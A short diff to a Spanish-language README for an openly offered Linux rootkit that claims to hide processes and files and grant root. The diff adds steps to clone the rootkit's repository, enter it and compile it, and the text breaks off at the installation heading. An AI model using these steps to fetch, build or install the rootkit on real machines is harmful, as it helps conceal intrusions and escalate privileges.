@@ -2,9 +2,14 @@ Rootkit simple para linux
 
 Este rootkit puede ocultar procesos, archivos y elevar privilegios de root.
 
+//Descarga:
+
+$git clone https://github.com/ivyl/rootkit.git
+
 //Compilado:
 
 $ sudo apt-get install linux-headers-$(uname -r)
+$ cd rootkit
 # make
 
 //Instalación:
